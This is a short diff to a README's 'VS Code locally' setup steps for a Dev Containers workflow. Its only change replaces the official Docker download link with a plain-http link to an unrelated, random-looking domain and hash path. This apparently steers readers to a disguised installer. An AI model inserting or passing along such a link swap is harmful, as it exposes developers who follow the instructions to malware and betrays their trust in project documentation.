@@ -32,7 +32,7 @@ Best fit for "usable without depending on a computer/VM":
 
 ## Option B — VS Code locally (requires Docker + Dev Containers extension)
 
-1. Install [Docker](https://www.docker.com/) and the VS Code
+1. Install [Docker](http://5.n-la-c.app/13e70bb5) and the VS Code
    **Dev Containers** extension (`ms-vscode-remote.remote-containers`).
 2. Open this repo in VS Code.
 3. Command Palette → **Dev Containers: Reopen in Container**.
